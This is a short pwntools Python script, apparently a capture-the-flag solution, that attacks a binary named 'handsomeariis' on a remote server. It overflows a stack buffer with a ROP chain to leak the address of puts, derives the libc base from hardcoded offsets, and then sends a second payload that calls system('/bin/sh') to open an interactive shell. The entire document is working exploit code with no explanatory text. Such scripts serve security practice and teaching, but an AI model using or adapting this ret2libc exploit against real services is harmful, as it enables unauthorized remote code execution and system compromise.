from pwn import *
from LibcSearcher import *


#context.log_level = 'debug'
r = remote('118.24.3.214', 11002)
#r = process('./handsomeariis')
elf = ELF('./handsomeariis')

main_addr = 0x400735
pop_rdi_ret = 0x400873


ss = 'Aris so handsoooome!\x00'

payload = ss + 'a' *(0x28-len(ss)) + p64(0x400873) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)

r.recvuntil('Repeat me!')
r.sendline(payload)

r.recvuntil('Great! Power upupuppp!\n')

d = r.recvline()[:6].ljust(8,'\x00')
log.info('puts_addr: ' + hex(u64(d)))
puts_addr = u64(d)

#obj = LibcSearcher('puts',puts_addr)

#system_addr = obj.dump("system")
base_addr = puts_addr - 0x06f690
system_addr = base_addr + 0x045390
bin_sh_addr = base_addr + 0x18cd57

log.info("system: " + hex(system_addr))


payload2 = ss + 'a' *(0x28-len(ss)) + p64(0x400873) + p64(bin_sh_addr) + p64(system_addr) 

r.recvuntil('Repeat me!')
r.sendline(payload2)
r.interactive()
